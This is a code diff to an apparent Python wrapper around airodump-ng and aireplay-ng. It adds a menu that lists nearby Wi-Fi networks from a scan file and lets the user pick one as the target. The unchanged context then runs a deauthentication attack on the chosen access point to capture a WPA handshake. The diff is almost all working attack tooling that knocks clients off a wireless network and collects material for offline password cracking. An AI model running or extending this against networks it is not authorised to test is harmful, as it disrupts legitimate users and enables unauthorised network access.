@@ -59,18 +59,55 @@ def set_monitor_mode(interface):
 def scan_wifi(mon_interface):
     print(Fore.YELLOW + "\nCtrl+c for stop scan")
     time.sleep(2)
-    proces = sub.Popen(["airodump-ng", mon_interface])
+    proces = sub.Popen(["airodump-ng", mon_interface, "-w", "output"])
     try:
         proces.wait()
     except:
         print(Fore.GREEN + "\nScan ended")
 
 
+def select_wifi():
+    output_file = "output-01.csv"
+
+    total_wifi_number = 0
+
+    bssid_list = []
+    ssid_list = []
+    channel_list = []
+    print(Fore.YELLOW + f"\n  \tNAME\t\t\t CHANNEL\t\tBSSID")
+    with open(output_file, "r") as file:
+        for line in file:
+            if "Station" in line:
+                break
+            else:
+                match_bssid = re.search(r"(\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)", line)
+                match_channel = re.search(r"\d\d:\d\d:\d\d,\s(..),", line)
+                match_ssid = re.search(r"\s\d,\s(\D+),", line)
+                if match_bssid and match_channel and match_ssid:
+                    bssid_list.append(match_bssid.group(1))
+                    channel_list.append(match_channel.group(1))
+                    ssid_list.append(match_ssid.group(1))
+                    print(Fore.RED + f"\n{total_wifi_number+1}) {bssid_list[total_wifi_number]}\t\t\t{channel_list[total_wifi_number]}\t\t{ssid_list[total_wifi_number]}")
+                    total_wifi_number += 1
+    files = glob.glob("output-01.*")
+    for file in files:
+        sub.Popen(["rm", file])
+    while True:
+        choose = int(input(Fore.GREEN + f"\nSelect the target number: "))
+        if choose <= total_wifi_number:
+            break
+        else:
+            print(Fore.RED + f"\nPlease enter the possible number")
+
+    return bssid_list[choose-1],channel_list[choose-1]
+
+
+
 
 def scan_target(bssid, channel, mon_interface, name,zaman):
 
     airodump_process = sub.Popen(["xterm", "-geometry", "100x60+100+100", "-e", "airodump-ng", "--bssid", bssid, "--channel", channel, "--write", name, mon_interface])
-    time.sleep(2)
+    time.sleep(3)
     aireplay_process = sub.Popen(["xterm","-geometry", "100x60+800+100", "-e", "aireplay-ng", "--deauth", "15", "-a", bssid, mon_interface])
     aireplay_process.wait()
 
@@ -133,10 +170,15 @@ interface = input(Fore.GREEN + "\nEnter the interface name (wlan0) : ")
 
 mon_interface = set_monitor_mode(interface)
 scan_wifi(mon_interface)
+bssid = 0
+channel = 0
+
+bssid, channel = select_wifi()
+bssid = bssid.strip()
+channel = channel.strip()
 
 
-bssid = input(Fore.GREEN + "\nEnter the target BSSID: ")
-channel = input(Fore.GREEN + "\nEnter the target channel: ")
+
 while True:
     try:
         zaman = int(input(Fore.GREEN + "\nEnter time for capture handshake (best is 20-30): "))
